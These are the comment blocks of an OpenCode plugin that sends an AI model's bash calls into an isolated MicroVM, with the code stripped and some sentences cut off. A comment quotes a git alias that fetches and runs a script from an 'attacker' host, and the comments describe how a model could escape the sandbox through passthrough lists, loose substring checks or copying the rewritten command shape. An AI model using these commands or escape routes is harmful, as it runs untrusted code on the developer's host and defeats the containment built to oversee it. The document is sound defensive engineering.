/**
 * cubesandbox-bash.js — OpenCode plugin that redirects every `bash` tool call
 * into an isolated CubeSandbox MicroVM.
 *
 * Why this exists
 * ---------------
 * OpenCode runs on the developer host. Every `bash` command the model issues
 * therefore executes on that host with the developer's own privileges. MCP- or
 * SDK-based sandbox integrations only help when the model *chooses* a sandbox
 * tool; a plain `bash` call still lands on the host with no isolation.
 *
 * This plugin uses the `tool.execute.before` hook to rewrite the `bash`
 * command before OpenCode executes it. The model keeps issuing ordinary `bash`
 * calls and needs no prompt, tool, or workflow changes.
 *
 *   OpenCode (host)
 *     ├── read / write / edit ──────────────► host project files
 *     └── bash ──► tool.execute.before ──► exec_backend.py ──► CubeAPI ──► MicroVM
 *                  (this file)                                 (:3000)
 *
 * Only `bash` is redirected. `read`, `write`, and `edit` keep operating on host
 * files, so OpenCode still edits the local project while its shell commands run
 * in a throwaway kernel, filesystem, and network namespace.
 *
 * Design decisions
 * ----------------
 * 1. Fail closed. If the command cannot be rewritten safely, the hook throws.
 *    OpenCode then blocks the call instead of silently running it on the host.
 *    A sandbox integration that falls back to the host on error is worse than
 *    no integration at all, because the failure is invisible.
 *
 * 2. Injection safe. The original command is passed as a single argv element to
 *    the backend, never interpolated into a shell string. Shell metacharacters
 *    and newlines cannot break out onto the host.
 *
 * 3. Session-scoped state, not a session-scoped VM. The backend creates a fresh
 *    MicroVM per call and replays the recorded working directory and exported
 *    environment into it, keyed by the session id taken from the hook input.
 *    Consecutive commands therefore observe each other's `cd` and `export`,
 *    which is what a user expects from a shell, but filesystem changes do not
 *    survive: a file written by one call is gone by the next. See the known
 *    limitations in the README.
 *
 * Hook contract (https://opencode.ai/docs/plugins/)
 * -------------------------------------------------
 *   "tool.execute.before": async (input, output) => { ... }
 *     input.tool       tool name, e.g. "bash"
 *     input.sessionID  current session identifier (name varies by version;
 *                      several spellings are probed, see resolveSessionId)
 *     output.args      mutable tool arguments; assigning output.args.command
 *                      changes what actually runs

 * Commands that must not be redirected.

 * Empty by default, and that default is a security decision.
 *
 * Passthrough is an arbitrary-host-execution escape hatch, not a narrow

 * every `git`-prefixed command — and git can be made to run arbitrary shell:
 *
 *     git -c alias.x='!curl http://attacker/sh | bash' x
 *
 * That executes on the host, unsandboxed and unlogged. Since the model's
 * commands are precisely the untrusted input this plugin exists to contain, a
 * default list containing `git` would re-open the host-execution path the
 * plugin closes. Verified against real git: the alias form above does run.
 *
 * The trade-off is real and is why the list exists at all: the sandbox has its
 * own filesystem, so a `git` command executed there operates on a different
 * repository than the one OpenCode is editing through `read` / `write` /
 * `edit`. Developers who need host git can opt in:
 *
 *     export CUBE_OPENCODE_PASSTHROUGH=git,gh
 *
 * Anything placed on this list must be treated as fully trusted with host
 * privileges. Opting in is a deliberate choice; it should not be the default.

/**
 * Extract a session identifier from the hook input.

 *
 * The fallback is a correctness trade-off worth stating plainly: if every known
 * key is missing, all sessions collapse onto the shared `"default"` state file
 * and lock, so cwd and exported environment bleed between concurrent sessions.
 * It never causes a host escape — commands still run inside a MicroVM — but it
 * is stronger than merely losing reuse granularity.

 *
 * A substring test such as `command.includes("exec_backend.py")` is a host
 * escape: `ls exec_backend.py`, `echo x # exec_backend.py`, and

 *
 * Every fixed position is pinned: the interpreter, the backend path, both flags,
 * and the session id derived from this same call. Pinning the session id matters
 * because `read` is deliberately not sandboxed, so a model can read this file
 * and reproduce the shape from it. Without the session check it could emit a
